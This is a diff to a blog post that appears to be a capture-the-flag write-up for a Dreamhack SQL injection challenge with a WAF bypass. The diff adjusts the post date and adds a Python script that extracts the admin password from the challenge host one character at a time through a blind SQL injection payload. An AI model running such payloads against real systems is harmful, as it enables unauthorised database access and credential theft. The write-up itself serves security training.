@@ -1,7 +1,7 @@
 ---
 layout: post
 title:  "[Dreamhack]Advanced WAF Bypass SQLI"
-date:   2024-05-25 00:29:20 +0700
+date:   2024-05-25 22:59:20 +0530
 categories: ctfwriteup
 ---
 
@@ -111,3 +111,27 @@ print(f"Admin upw length is {length}")
 
 The length of upw is 44 and now we can bruteforce each character and find the flag.
 
+```
+import requests
+import urllib.parse
+
+host = "http://host3.dreamhack.games:18985"
+
+charSet = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
+
+length=44
+pos=0
+flag=''
+for i in range(0,45):
+	pos= pos+1
+	for j in charSet:
+		payload = f"'||(uid=concat('adm','in')&&substr(upw,{i},1)='{j}')#"
+		encoded_payload = urllib.parse.quote(payload)
+		data = requests.get(f"{host}/?uid={encoded_payload}")
+		if "admin" in data.text:
+			print(f"found character {j} in position {i}")
+			flag = flag+j
+			break
+
+print(f"Flag : {flag}")
+```
